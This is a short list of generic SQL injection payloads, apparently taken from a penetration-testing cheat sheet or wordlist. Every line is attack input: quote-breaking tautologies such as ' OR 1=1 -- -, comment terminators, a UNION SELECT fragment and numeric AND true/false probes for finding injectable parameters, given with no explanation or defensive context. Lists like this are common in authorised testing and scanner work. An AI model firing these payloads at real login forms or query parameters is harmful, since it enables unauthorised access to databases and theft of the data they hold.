#### Generic SQL Injection Payloads

```cadence
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
 OR 1=1
 ' OR 'x'='x
 ' AND id IS NULL; --
 '''''''''''''UNION SELECT '2

\# Numeric

AND 1
AND 0
AND true
AND false
```
